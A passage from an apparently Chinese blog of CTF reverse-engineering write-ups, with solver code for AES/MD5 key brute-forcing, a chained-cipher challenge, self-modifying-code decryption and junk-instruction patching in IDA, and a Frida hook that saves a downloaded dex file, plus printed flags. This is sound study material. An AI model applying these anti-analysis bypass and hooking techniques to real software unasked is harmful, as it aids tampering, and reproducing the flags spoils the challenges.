clen, char* key) &#123;    int keylen = strlen(key);    if (clen == 0 || clen % 16 != 0) &#123;        return 0;    &#125;    if (!checkKeyLen(keylen)) &#123;        return 0;    &#125;    xor1((unsigned char*)key);    extendKey(key);//扩展密钥    int cArray[4][4];    for (int k = 0; k &lt; clen; k += 16) &#123;        xor1((unsigned char*)c + k);        convertToIntArray(c + k, cArray);        addRoundKey(cArray, 10);        int wArray[4][4];        for (int i = 9; i &gt;= 1; i--) &#123;            deSubBytes(cArray);            deShiftRows(cArray);            deMixColumns(cArray);            getArrayFrom4W(i, wArray);            deMixColumns(wArray);            addRoundTowArray(cArray, wArray);        &#125;        deSubBytes(cArray);        deShiftRows(cArray);        addRoundKey(cArray, 0);        convertArrayToStr(cArray, c + k);        xor2((unsigned char*)c + k);    &#125;&#125;//MD5算法初始化操作void MD5Init(MD5_CTX* context)&#123;    //bit计数器清零    context-&gt;count[0] = context-&gt;count[1] = 0;    //A,B,C,D被初始化为四个特定的常数(Magic Number)    context-&gt;state[0] = 0x67452301;    context-&gt;state[1] = 0xefcdab89;    context-&gt;state[2] = 0x98badcfe;    context-&gt;state[3] = 0x10325476;&#125;//使用MD5算法对input的数据进行处理void MD5Update(MD5_CTX* context, unsigned char* input, unsigned int inputLen)&#123;    unsigned int i, index, partLen;    //计算[已处理数据长度(byte) mod 64]    index = (unsigned int)((context-&gt;count[0] &gt;&gt; 3) &amp; 0x3F);    //bit计数器累加    if ((context-&gt;count[0] += ((unsigned int)inputLen &lt;&lt; 3))        &lt; ((unsigned int)inputLen &lt;&lt; 3)) //处理加法进位溢出的情况        context-&gt;count[1]++;    context-&gt;count[1] += ((unsigned int)inputLen &gt;&gt; 29);    //计算缓冲区还有多少字节空间    partLen = 64 - index;    //以512位数据为一组进行处理    if (inputLen &gt;= partLen) &#123;        memcpy(&amp;context-&gt;buffer[index], input, partLen);        MD5Transform(context-&gt;state, context-&gt;buffer);        for (i = partLen; i + 63 &lt; inputLen; i += 64)            MD5Transform(context-&gt;state, &amp;input[i]);        index = 0;    &#125;    else i = 0;    //缓存未处理的输入    memcpy(&amp;context-&gt;buffer[index], &amp;input[i], inputLen - i);&#125;//获取MD5码（由digest返回），顺便清除context数据void MD5Final(unsigned char digest[16], MD5_CTX* context)&#123;    unsigned char bits[8];    unsigned int index, padLen;    //记录数据长度    Encode(bits, context-&gt;count, 8);    //填充数据    index = (unsigned int)((context-&gt;count[0] &gt;&gt; 3) &amp; 0x3f);    padLen = (index &lt; 56) ? (56 - index) : (120 - index);    MD5Update(context, PADDING, padLen);    //追加数据长度信息    MD5Update(context, bits, 8);    //获取MD5码。其实就是将ABCD四个32位整数以16进制方式级联    Encode(digest, context-&gt;state, 16);    //清除数据    memset(context, 0, sizeof(*context));&#125;//MD5变换函数void MD5Transform(unsigned int state[4], unsigned char block[64])&#123;    unsigned int a = state[0], b = state[1], c = state[2], d = state[3], x[16];    //将64字节的一组数据进一步划分为16个子分组    Decode(x, block, 64);    //第1轮循环变换    FF(a, b, c, d, x[0], S11, 0xd76aa478); /* 1 */    FF(d, a, b, c, x[1], S12, 0xe8c7b756); /* 2 */    FF(c, d, a, b, x[2], S13, 0x242070db); /* 3 */    FF(b, c, d, a, x[3], S14, 0xc1bdceee); /* 4 */    FF(a, b, c, d, x[4], S11, 0xf57c0faf); /* 5 */    FF(d, a, b, c, x[5], S12, 0x4787c62a); /* 6 */    FF(c, d, a, b, x[6], S13, 0xa8304613); /* 7 */    FF(b, c, d, a, x[7], S14, 0xfd469501); /* 8 */    FF(a, b, c, d, x[8], S11, 0x698098d8); /* 9 */    FF(d, a, b, c, x[9], S12, 0x8b44f7af); /* 10 */    FF(c, d, a, b, x[10], S13, 0xffff5bb1); /* 11 */    FF(b, c, d, a, x[11], S14, 0x895cd7be); /* 12 */    FF(a, b, c, d, x[12], S11, 0x6b901122); /* 13 */    FF(d, a, b, c, x[13], S12, 0xfd987193); /* 14 */    FF(c, d, a, b, x[14], S13, 0xa679438e); /* 15 */    FF(b, c, d, a, x[15], S14, 0x49b40821); /* 16 */    //第2轮循环变换    GG(a, b, c, d, x[1], S21, 0xf61e2562); /* 17 */    GG(d, a, b, c, x[6], S22, 0xc040b340); /* 18 */    GG(c, d, a, b, x[11], S23, 0x265e5a51); /* 19 */    GG(b, c, d, a, x[0], S24, 0xe9b6c7aa); /* 20 */    GG(a, b, c, d, x[5], S21, 0xd62f105d); /* 21 */    GG(d, a, b, c, x[10], S22, 0x2441453); /* 22 */    GG(c, d, a, b, x[15], S23, 0xd8a1e681); /* 23 */    GG(b, c, d, a, x[4], S24, 0xe7d3fbc8); /* 24 */    GG(a, b, c, d, x[9], S21, 0x21e1cde6); /* 25 */    GG(d, a, b, c, x[14], S22, 0xc33707d6); /* 26 */    GG(c, d, a, b, x[3], S23, 0xf4d50d87); /* 27 */    GG(b, c, d, a, x[8], S24, 0x455a14ed); /* 28 */    GG(a, b, c, d, x[13], S21, 0xa9e3e905); /* 29 */    GG(d, a, b, c, x[2], S22, 0xfcefa3f8); /* 30 */    GG(c, d, a, b, x[7], S23, 0x676f02d9); /* 31 */    GG(b, c, d, a, x[12], S24, 0x8d2a4c8a); /* 32 */    //第3轮循环变换    HH(a, b, c, d, x[5], S31, 0xfffa3942); /* 33 */    HH(d, a, b, c, x[8], S32, 0x8771f681); /* 34 */    HH(c, d, a, b, x[11], S33, 0x6d9d6122); /* 35 */    HH(b, c, d, a, x[14], S34, 0xfde5380c); /* 36 */    HH(a, b, c, d, x[1], S31, 0xa4beea44); /* 37 */    HH(d, a, b, c, x[4], S32, 0x4bdecfa9); /* 38 */    HH(c, d, a, b, x[7], S33, 0xf6bb4b60); /* 39 */    HH(b, c, d, a, x[10], S34, 0xbebfbc70); /* 40 */    HH(a, b, c, d, x[13], S31, 0x289b7ec6); /* 41 */    HH(d, a, b, c, x[0], S32, 0xeaa127fa); /* 42 */    HH(c, d, a, b, x[3], S33, 0xd4ef3085); /* 43 */    HH(b, c, d, a, x[6], S34, 0x4881d05); /* 44 */    HH(a, b, c, d, x[9], S31, 0xd9d4d039); /* 45 */    HH(d, a, b, c, x[12], S32, 0xe6db99e5); /* 46 */    HH(c, d, a, b, x[15], S33, 0x1fa27cf8); /* 47 */    HH(b, c, d, a, x[2], S34, 0xc4ac5665); /* 48 */    //第4轮循环变换    II(a, b, c, d, x[0], S41, 0xf4292244); /* 49 */    II(d, a, b, c, x[7], S42, 0x432aff97); /* 50 */    II(c, d, a, b, x[14], S43, 0xab9423a7); /* 51 */    II(b, c, d, a, x[5], S44, 0xfc93a039); /* 52 */    II(a, b, c, d, x[12], S41, 0x655b59c3); /* 53 */    II(d, a, b, c, x[3], S42, 0x8f0ccc92); /* 54 */    II(c, d, a, b, x[10], S43, 0xffeff47d); /* 55 */    II(b, c, d, a, x[1], S44, 0x85845dd1); /* 56 */    II(a, b, c, d, x[8], S41, 0x6fa87e4f); /* 57 */    II(d, a, b, c, x[15], S42, 0xfe2ce6e0); /* 58 */    II(c, d, a, b, x[6], S43, 0xa3014314); /* 59 */    II(b, c, d, a, x[13], S44, 0x4e0811a1); /* 60 */    II(a, b, c, d, x[4], S41, 0xf7537e82); /* 61 */    II(d, a, b, c, x[11], S42, 0xbd3af235); /* 62 */    II(c, d, a, b, x[2], S43, 0x2ad7d2bb); /* 63 */    II(b, c, d, a, x[9], S44, 0xeb86d391); /* 64 */    state[0] += a;    state[1] += b;    state[2] += c;    state[3] += d;&#125;//将无符号整数转为字节类型数组void Encode(unsigned char* output, unsigned int* input, unsigned int len)&#123;    unsigned int i, j;    for (i = 0, j = 0; j &lt; len; i++, j += 4) &#123;        output[j] = (unsigned char)(input[i] &amp; 0xff);        output[j + 1] = (unsigned char)((input[i] &gt;&gt; 8) &amp; 0xff);        output[j + 2] = (unsigned char)((input[i] &gt;&gt; 16) &amp; 0xff);        output[j + 3] = (unsigned char)((input[i] &gt;&gt; 24) &amp; 0xff);    &#125;&#125;//将字节类型数组转为无符号整数void Decode(unsigned int* output, unsigned char* input, unsigned int len)&#123;    unsigned int i, j;    for (i = 0, j = 0; j &lt; len; i++, j += 4)        output[i] = ((unsigned int)input[j]) | (((unsigned int)input[j + 1]) &lt;&lt; 8) |        (((unsigned int)input[j + 2]) &lt;&lt; 16) | (((unsigned int)input[j + 3]) &lt;&lt; 24);&#125;int main()&#123;    uint8_t mm[] = &#123; 0xCD, 0x16, 0xDB, 0xB5, 0xD1, 0x02, 0xA4, 0x82, 0x8E, 0x59, 0x73, 0x9E, 0x96, 0x26, 0x56, 0xF2,0x16, 0x8E, 0x46, 0xF2, 0x55, 0x7B, 0x92, 0x31, 0x30, 0xDC, 0xAA, 0x8A, 0xF3, 0x1C, 0xA0, 0xAA &#125;;    for (int n = 0; n &lt; 13; n++) &#123;        for (int m = 0; m &lt; 31; m++) &#123;            MD5_CTX md5_calc;            unsigned int c[] = &#123; 0x00000007, 0x00000002, 0x0000007c &#125;;            c[0] = m;            c[1] = n;            unsigned char md5[17];            MD5Init(&amp;md5_calc);            MD5Update(&amp;md5_calc, (unsigned char*)c, 12);            MD5Final(md5, &amp;md5_calc);            for (int i = 0; i &lt; 16; i++) &#123;                md5[i] ^= 0x14;                md5[i] ^= 0x11;            &#125;            char in[100];            for (int l = 0; l &lt; 32; l++) &#123;                in[l] = mm[l];            &#125;            md5[16] = &#x27;\\0&#x27;;            deAes(in,32,(char*)md5 );            if (!strncmp(&quot;NSSCTF&quot;,in,6)) &#123;                printf(&quot;2024年%d月%d日\\n&quot;, n+1, m);                for (int i = 0; i &lt; 32; ++i) &#123;                    printf(&quot;%c&quot;,(unsigned char)in[i]);                &#125;            &#125;        &#125;    &#125;    return 0;&#125;// 2024年7月21日// NSSCTF&#123;W0w_Y0u&#x27;re_@n_AE5_M@5t3r&#125;\n\n\nCanon程序把输入分成三部分，并按照规定的流程把每个部分作为密钥和输入进行加密操作。加密函数里面有6种操作，根据传入的参数选择特定的操作。\n用在选择操作的位置下断点用idapython提取程序的执行流程。\nmain函数\n\n加密函数\n\n得到程序的执行流程\n0, 0, 1, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2  //第一层控制流1, 5, 1, 6, 5, 1, 3, 6, 5, 4, 3, 6, 1, 4, 3, 4, 1, 4, 5, 4, 1  //第二层控制流\n\n现在去逆向加密函数里面的每一个操作\ncase1是一个位移加密。case2没有用到就不管了。case3把数据按列存储按行读出，即行列互换。\ncase4把最一个元素放到第一位去，后面的元素向后移一位。case5把输入与密文异或并进行换表base64加密。case6是一个魔改rc4加密，异或完后加上57，然后进行换表base64编码。把所有加密逆向一遍按控制流反向执行就行。一些要注意的问题写在脚本注释里了。解密后有些数据里面有0，用strlen会直接得到错误的长度。尽量别用strlen。\n#include &lt;stdio.h&gt;#include&lt;string.h&gt;#include &lt;stdlib.h&gt;#define size 256char base64[65] = &quot;stuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqr&quot;;int op1[] = &#123;0, 0, 1, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2&#125;; //第一层控制流int op2[] = &#123; 1, 5, 1, 6, 5, 1, 3, 6, 5, 4, 3, 6, 1, 4, 3, 4, 1, 4, 5, 4, 1 &#125;;//第二层控制流int rexor5(char* data1, char* data2, int len);void enc_dec(unsigned char* key, unsigned char* data, int n);void init_sbox(unsigned char* key);int rerc4r6(char* data1, char* data2, int len);int re3(char* data1, char* data2, int len);int re4(char* data1, char* data2, int len);int decodeBase64(char* str, int len);void re1(char* Source, int i, char* Destination, int v21) &#123;    for (int j = 0; j &lt; i; ++j) &#123;        char v22 = Destination[j % v21];        if (Source[j] &gt;= &#x27;A&#x27; &amp;&amp; Source[j] &lt;= &#x27;Z&#x27;) &#123;            for (int i = 65; i &lt;= 90; i++) &#123; //直接爆破，遍历符合逻辑的source                char a = (i + v22 - &#x27;A&#x27;) % 26;                char b = Source[j] - &#x27;A&#x27;;                if (b == a) &#123; Source[j] = i; break; &#125;;            &#125;        &#125;        else if (Source[j] &gt;= &#x27;a&#x27; &amp;&amp; Source[j] &lt;= &#x27;z&#x27;) &#123;            for (int i = 97; i &lt;= &#x27;z&#x27;; i++) &#123;                char a = (i + v22 - &#x27;a&#x27;) % 26;                if (Source[j] - &#x27;a&#x27; == a) &#123; Source[j] = i; break; &#125;;            &#125;        &#125;        else if (Source[j] &gt;= &#x27;0&#x27; &amp;&amp; Source[j] &lt;= &#x27;9&#x27;) &#123;            for (int i = &#x27;0&#x27;; i &lt;= &#x27;9&#x27;; i++) &#123;                char a = (i + v22 - &#x27;0&#x27;) % 10;                if (Source[j] - &#x27;0&#x27; == a) &#123; Source[j] = i; break; &#125;;            &#125;        &#125;    &#125;&#125;int main() &#123;    char m1[] = &quot;WgvDmssEvcY326bHo3nNro3vXvvfmgrz&quot;;    char m2[] = &quot;gX+Ri9PG=bt5=00B6hscPQOL&quot;;    char m3[] = &quot;T6bHgUPL2gXUd=xT=FNHtPzV&quot;;    for (int i = 20; i&gt;=0; i--) &#123; //反向遍历        switch (op1[i]) &#123; //选择加密方法和密钥        case 0:            switch (op2[i]) &#123;            case 1:                re1(m1, strlen(m1), m2, strlen(m2));                break;            case 3:                re3(m1, m2, strlen(m1));                break;            case 4:                re4(m1, m2, strlen(m1));                break;            case 5:                rexor5(m1, m2, strlen(m1));                break;            case 6:                rerc4r6(m1, m2, strlen(m1));                break;            &#125;            break;        case 1:            switch (op2[i]) &#123;            case 1:                re1(m2, strlen(m2), m3, strlen(m3));                break;            case 3:                re3(m2, m3, strlen(m2));                break;            case 4:                re4(m2, m3, strlen(m2));                break;            case 5:                rexor5(m2, m3, strlen(m2));                break;            case 6:                rerc4r6(m2, m3, strlen(m2));                break;            &#125;            break;        case 2:            switch (op2[i]) &#123;            case 1:                re1(m3, strlen(m3), m1, strlen(m1));                break;            case 3:                re3(m3, m1, strlen(m3));                break;            case 4:                re4(m3, m1, strlen(m3));                break;            case 5:                rexor5(m3, m1, strlen(m3));                break;            case 6:                rerc4r6(m3, m1, strlen(m3));                break;            &#125;            break;        &#125;    &#125;    printf(&quot;%s&quot;, m1);    printf(&quot;%s&quot;, m2);    printf(&quot;%s&quot;, m3);&#125;int rexor5(char* data1, char* data2, int len) &#123;    int k = decodeBase64(data1,len); //data1解密后会有0，于是直接让decode函数返回正确长度    for (int i = 0; i &lt; k; i++) &#123;        data1[i] = (data2[i % strlen(data2)] + 57) ^ (unsigned char)data1[i];    &#125;    return 0;&#125;int rerc4r6(char* data1, char* data2, int len) &#123;    int k =decodeBase64(data1, len); //同上    for (int i = 0; i &lt;len ; i++) &#123;        data1[i] -= 57;    &#125;    enc_dec((unsigned char*)data2, (unsigned char*)data1,k);    data1[k] = &#x27;\\0&#x27;;    return 0;&#125;int re3(char* data1, char* data2, int len) &#123;    char block[13][13];    char blocklen = data2[0] % 10 + 2;    for (int i = 0; i &lt; blocklen; i++) &#123;        memset(block[i], 0, len + 1);    &#125;    int i = 0, index = 0,reamind = len%blocklen;    for (int jj = 0; jj &lt; blocklen; ++jj) &#123;        int leng = len / blocklen;        if (reamind &gt; 0) &#123; leng++; reamind--; &#125; //注意剩余的元素要多用一列输入，直接加1会导致列数不正确        for (int kk = 0; kk  &lt;leng ; ++kk) &#123;            if (index &lt; len) &#123;                *(char*)(block[jj] + kk) = data1[index++]; //按行输入            &#125;        &#125;    &#125;    index = 0;    for (i = 0; i * blocklen &lt; len; ++i) &#123;        for (int ii = 0; ii &lt; blocklen &amp;&amp; ii + blocklen * i &lt; len; ++ii) &#123;            data1[ii + blocklen * i] = *(char*)(block[ii] + i); //按列取出        &#125;    &#125;    return 0;&#125;int re4(char* data1, char* data2, int len) &#123;    char blocklen = data2[0] % 10 + 2;    for (int nn = 0; nn &lt; blocklen; ++nn)    &#123;        char v11 = data1[0];        for (int i1 = 0; i1 &lt; len-1; ++i1)            data1[i1] = data1[i1+1];        data1[len-1] = v11;    &#125;    return 0;&#125;unsigned char sbox[257] = &#123; 0 &#125;;void init_sbox(unsigned char* key) &#123;    unsigned int i, j, k;    int tmp;    for (i = 0; i &lt; size; i++) &#123;        sbox[i] = i;    &#125;    j =k = 0;    for (i = 0; i &lt; size; i++) &#123;        tmp = sbox[i];        j = (j + tmp + key[i % strlen((char*)key)]) % size;         sbox[i] = sbox[j];        sbox[j] = tmp;    &#125;&#125;void enc_dec(unsigned char* key, unsigned char* data,int n) &#123;    int i, j, k, R, tmp;    init_sbox(key);    j = k = 0;    for (i = 0; i &lt; n; i++) &#123;        j = (j + 1) % size;        k = (k + sbox[j]) % size;        tmp = sbox[j];        sbox[j] = sbox[k];        sbox[k] = tmp;        R = sbox[(sbox[j] + sbox[k]) % size];                data[i] ^= R;            &#125;&#125;int decodeBase64(char* str, int len) &#123;        unsigned char ascill[129] = &#123; 0 &#125;;    int k = 0;    for (int i = 0; i &lt; 64; i++) &#123;        ascill[base64[i]] = k++;    &#125;    int decodeStrlen = len / 4 * 3 + 1;    char* decodeStr = (char*)malloc(sizeof(char) * decodeStrlen);    k = 0;    for (int i = 0; i &lt; len; i++) &#123;        unsigned char a, b, c;        a = ascill[str[i]];        b = ascill[str[++i]];        c = (a &lt;&lt; 2) | (b &gt;&gt; 4);        decodeStr[k++] = c;        if (str[i + 1] == &#x27;=&#x27;) &#123;            break;        &#125;        a = ascill[str[i]];        b = ascill[str[++i]];        c = (a &lt;&lt; 4) | (b &gt;&gt; 2);        decodeStr[k++] = c;        if (str[i + 1] == &#x27;=&#x27;) &#123;            break;        &#125;        a = ascill[str[i]];        b = ascill[str[++i]];        c = (a &lt;&lt; 6) | (b);        decodeStr[k++] = c;    &#125;    decodeStr[k] = &#x27;\\0&#x27;;    for (int i = 0; i &lt;= k; i++) &#123;        str[i] = decodeStr[i];    &#125;    free(decodeStr);    return k; //返回长度以便进行数据处理&#125;//NSSCTF&#123;P4ch3Lbel&#x27;s_C@n0n_1n_D_mAjOr&#125;\n\nRoom 0多看看main前面的函数就可以发现一个smc函数，用一个传进来的密钥对enc段进行异或解密，动调可以发现其实密钥就是我们输入进来的key。\n\n\n交叉引用发现了异常处理中调用了函数，加上之前在main里面看到的中有一个除法运算可以推测出我们输入的密钥应该是要触发除0异常，于是打算直接把运算函数拿下来进行爆破。我们可以知道函数开头3字节的值是固定的55 8b ec，我们可以先提取出enc函数的前三字节进行异或得到前三位密钥再进行爆破。\n\n这个函数把hex字符串转为对应的整数。我们的输入应该是结果的十六进制字符串。\n\n前3字节是75 5f f0直接提取出伪代码爆破最后一字节\n#include&lt;stdio.h&gt;unsigned int __cdecl sub_402000(unsigned int inputInt)&#123;    int iterator; // [esp+4h] [ebp-18h]    int byte1; // [esp+8h] [ebp-14h]    int byte2; // [esp+Ch] [ebp-10h]    int v6; // [esp+10h] [ebp-Ch]    int tempResult; // [esp+10h] [ebp-Ch]    unsigned int highByte; // [esp+14h] [ebp-8h]    int inputInt_1; // [esp+18h] [ebp-4h]    if (!inputInt)        return 0;    v6 = 0;    inputInt_1 = inputInt;    highByte = inputInt &gt;&gt; 24 &amp; 0xff;    byte2 = inputInt &gt;&gt; 16 &amp; 0xff;    byte1 = inputInt &gt;&gt; 8 &amp; 0xff;    for (iterator = 0; iterator &lt; 32; ++iterator)    &#123;        tempResult = v6 * (highByte + 1415881080) * (inputInt_1 - 1467486175) * ((highByte - inputInt_1) ^ (highByte &gt;&gt; 4));        byte2 = (inputInt_1 + byte2) ^ (8 * byte1);        byte1 = (inputInt_1 + highByte) ^ (8 * byte2);        highByte = (inputInt_1 + byte1) ^ (8 * byte2);        inputInt_1 -= byte1 + byte2 + highByte;        if (inputInt_1 - 1415881080 == 0)return inputInt;        v6 = tempResult            + (highByte + 1467486175)            * (((highByte - inputInt_1) ^ (unsigned __int64)(highByte &gt;&gt; 4))                / (unsigned int)(inputInt_1 - 1415881080));    &#125;    return 0;&#125;int main() &#123;    for (unsigned int i = 0x755ff000; i &lt; 0x755ff0ff; i++) &#123;        printf(&quot;%x\\n&quot;, sub_402000(i));    &#125;&#125;//755ff0d3\n\n得到密钥775ff0d3\n提取汇编指令，对dia内的数据进行异或处理\n用ida脚本对enc段解密，并去除花指令\nimport idcimport ida_bytes#获取范围内的数据def getbyte_data(start,end):    len = end - start    data = idc.get_bytes(start,len)    return datadef xordatas(data,key):    res = b&quot;&quot;    data = bytearray(data)    for i in range(len(data)):        data[i]= data[i] ^ key[i % 4]    print(data)    return data#smc解密def decsmc(start,end):    data = getbyte_data(start,end)    print(data)    try:        res = xordatas(data,bytes.fromhex(&quot;755ff0d3&quot;))        ida_bytes.patch_bytes(start,bytes(res))        print(res)        print(&quot;ok&quot;)    except Exception as e:        print(e)def nop_jzjnz(start_addr,endaddr,pattern):    length =len(pattern)    flag = 0    while start_addr &lt; endaddr:        getbytes =idc.get_bytes(start_addr,length) #获取指定范围内指定地址的字节码并返回成列表        if(getbytes[0]==pattern[0] and getbytes[1]==pattern[1] and getbytes[2] == pattern[2] and getbytes[3] == pattern[3]):  #匹配花指令模板            flag = 1            for i in range(length):                        idc.patch_byte(start_addr + i,0x90)  #nop            print(f&quot;success! nop 0x&#123;hex(start_addr)&#125; to 0x&#123;hex(start_addr + length -1)&#125; length:&#123;length&#125;&quot;)            start_addr += length - 1        start_addr += 1    if(flag == 0):        print(&quot;Not find!!!&quot;)        pattern = [0x50, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x83, 0xC0, 0x01, 0x83, 0xF8, 0x02, 0x74, 0x01, 0xC3, 0x58]pattern2 = [0x74, 0x03, 0x75, 0x01, 0xE8]start = 0x00401000end = 0x0401600decsmc(start,end)nop_jzjnz(start,end,pattern)nop_jzjnz(start,end,pattern2)\n\n下断点在xor处用ida脚本提取异或数据解密。\na = [108 ,151 ,243 ,25 ,138 ,171 ,25 ,23 ,75 ,150 ,94 ,212 ,54 ,212 ,84 ,188 ,19 ,254 ,13 ,11 ,193 ,228 ,32 ,170 ,123 ,232 ,5 ,169 ,64 ,237 ,253 ,212 ,]data = [0x22, 0xC4, 0xA0, 0x5A, 0xDE, 0xED, 0x62, 0x5E, 0x25, 0xE2, 0x6D, 0xA6, 0x05, 0xA7, 0x20, 0x8D, 0x7D, 0x99, 0x52, 0x3E, 0x8C, 0xA7, 0x7F, 0xFA, 0x09, 0xD8, 0x62, 0xDB, 0x00, 0x80, 0xC2, 0xA9]flag = &#x27;&#x27;for i,j in zip(a,data):    flag += chr(i ^ j)print(flag)#NSSCTF&#123;Int3r3st1ng_5MC_Pr0gr@m?&#125;\n\n这里的密钥是触发异常前v6的值，因为在触发异常后系统会把异常前的数据压入栈中保存以便后续的恢复。从下面也可以看出。\n\n插曲:我为了保证patch的部分不被原来的函数修改，于是nop掉了smc函数里面的一些代码，但是正好后面rc4的密钥是通过栈转递的，因为修改代码导致栈与原来不符，也就导致了密钥的不符，最后通过密钥转递的位置把修改了密钥的位置nop掉才行。\n","categories":["WriteUp"],"tags":["re,WriteUp"]},{"title":"2025VNCTF Re-wp+复现","url":"/2025/02/08/vnctf/","content":"hook_fish运行应用提示输入一串字符并要求联网。\njadx分析，发现在main中，在点击按钮后会调用encrypt()方法对我们输入的数据加密，然后调用fish()方法下载了一个“hook_fish.dex”文件。通过下面的registerReceiver方法创注册了一个广播接收器，只要收到系统下载完成的广播时，就会调用onReceive()方法。\nregisterReceiver(this.downloadCompleteReceiver, new IntentFilter(&quot;android.intent.action.DOWNLOAD_COMPLETE&quot;));\n\n在onReceive()方法中把加密后的的输入传入了MainActivity.this.loadClass();，加载下载来的.dex文件并反射调用了encode(input0);对输入再次加密，最后调用check()方法检查结果。然后删除本地的“hook_fish.dex”文件。\n我们先hook file.delete()方法，在删除前转移出dex文件(脚本1);\n在savedDexFile.dex中我们可以发现是一个自定义的加密方法，并且还附带了解密函数，和密文，我们直接拿下来用，用java写解题脚本就行(脚本2)。（在官方的脚本中通过hook调用decode方法先解密密文，再逆向写出decrypt解密）。\n脚本1\nJava.perform(function()&#123; //     var File = Java.use(&#x27;java.io.File&#x27;);// File.delete.implementation = function() &#123;//     var filePath = this.getAbsolutePath();  // 获取文件路径//     console.log(&quot;文件将在删除之前被保存: &quot; + filePath);//     // 在删除之前复制文件到其他位置//     var newFile = Java.use(&#x27;java.io.File&#x27;);//     var destPath = &quot;/data/data/com.example.hihitt/files/savedDexFile.dex&quot;;  // 新文件路径//     var sourceFile = this;//     var inputStream = Java.use(&#x27;java.io.FileInputStream&#x27;).$new(sourceFile);//     var outputStream = Java.use(&#x27;java.io.FileOutputStream&#x27;).$new(destPath);    //     var buffer = Java.array(&#x27;byte&#x27;, [1024]);  // 缓冲区//     var bytesRead;//     while ((bytesRead = inputStream.read(buffer)) !== -1) &#123;//         outputStream.write(buffer, 0, bytesRead);//     &#125;//     inputStream.close();//     outputStream.close();//     console.log(&quot;文件已保存到: &quot; + destPath);//     // 执行原本的删除操作//     return this.delete();// &#125;;let MainActivity = Java.use(&quot;com.example.hihitt.MainActivity&quot;);MainActivity[&quot;code&quot;].implementation = function (a, index) &#123;    console.log(`MainActivity.code is called: a=$&#123;a&#125;, index=$&#123;index&#125;`);    this[&quot;code&quot;](a, index);&#125;;MainActivity[&quot;encrypt&quot;].implementation = function (str) &#123;    console.log(`MainActivity.encrypt is called: str=$&#123;str&#125;`);    let result = this[&quot;encrypt&quot;](str);    console.log(`MainActivity.encrypt result=$&#123;result&#125;`);    return result;&#125;;&#125;)\n\n脚本2(不太会处理java的数据，最后用python来进行最后的异或)\nimport java.util.HashMap;public class Main &#123;    public static void main(String[] args) &#123;        String strr = &quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;;        hookfish hf = new hookfish();        String result = hf.decode(strr);        // 输出解码后的结果        System.out.println(&quot;解码结果: &quot; + result);        String decryptedString = decrypt(result);        System.out.println(&quot;解密后的字符串: &quot; + decryptedString);    &#125;    // 解密方法    public static String decrypt(String str) &#123;        // 将加密后的字符串转回字符数组        char[] str3 = str.toCharArray();        // 逆操作字符数组变换        for (int i = 0; i &lt; str3.length; i++) &#123;            if ((char) ((str3[i] - (i % 4)) + &#x27;1&#x27;) &gt;= &#x27;a&#x27; &amp;&amp; (char) ((str3[i] - (i % 4)) + &#x27;1&#x27;)&lt;= &#x27;f&#x27;) &#123;                str3[i] = (char) ((str3[i] - (i % 4)) + &#x27;1&#x27;);            &#125; else &#123;                str3[i] = (char) (str3[i] - (&#x27;7&#x27; + (i % 10)));            &#125;        &#125;        // 恢复异或操作        code(str3, 0);        // 将字符数组转为十六进制字符串        String str2= new String(str3);        // 将字节数组转换为原始字符串并返回        return str2;    &#125;    // 逆操作异或    private static void code(char[] a, int index) &#123;        if (index &gt;= a.length - 1) &#123;            return;        &#125;        a[index] = (char) (a[index] ^ a[index + 1]);        a[index + 1] = (char) (a[index] ^ a[index + 1]);        a[index] = (char) (a[index] ^ a[index + 1]);        code(a, index + 2);    &#125;&#125;public class hookfish &#123;    private HashMap&lt;String, Character&gt; fish_dcode;    private HashMap&lt;Character, String&gt; fish_ecode;    private String strr = &quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;;    public hookfish() &#123;        encode_map();        decode_map();    &#125;    public void encode_map() &#123;        HashMap&lt;Character, String&gt; hashMap = new HashMap&lt;&gt;();        this.fish_ecode = hashMap;        hashMap.put(&#x27;a&#x27;, &quot;iiijj&quot;);        this.fish_ecode.put(&#x27;b&#x27;, &quot;jjjii&quot;);        this.fish_ecode.put(&#x27;c&#x27;, &quot;jijij&quot;);        this.fish_ecode.put(&#x27;d&#x27;, &quot;jjijj&quot;);        this.fish_ecode.put(&#x27;e&#x27;, &quot;jjjjj&quot;);        this.fish_ecode.put(&#x27;f&#x27;, &quot;ijjjj&quot;);        this.fish_ecode.put(&#x27;g&#x27;, &quot;jjjji&quot;);        this.fish_ecode.put(&#x27;h&#x27;, &quot;iijii&quot;);        this.fish_ecode.put(&#x27;i&#x27;, &quot;ijiji&quot;);        this.fish_ecode.put(&#x27;j&#x27;, &quot;iiiji&quot;);        this.fish_ecode.put(&#x27;k&#x27;, &quot;jjjij&quot;);        this.fish_ecode.put(&#x27;l&#x27;, &quot;jijji&quot;);        this.fish_ecode.put(&#x27;m&#x27;, &quot;ijiij&quot;);        this.fish_ecode.put(&#x27;n&#x27;, &quot;iijji&quot;);        this.fish_ecode.put(&#x27;o&#x27;, &quot;ijjij&quot;);        this.fish_ecode.put(&#x27;p&#x27;, &quot;jiiji&quot;);        this.fish_ecode.put(&#x27;q&#x27;, &quot;ijijj&quot;);        this.fish_ecode.put(&#x27;r&#x27;, &quot;jijii&quot;);        this.fish_ecode.put(&#x27;s&#x27;, &quot;iiiii&quot;);        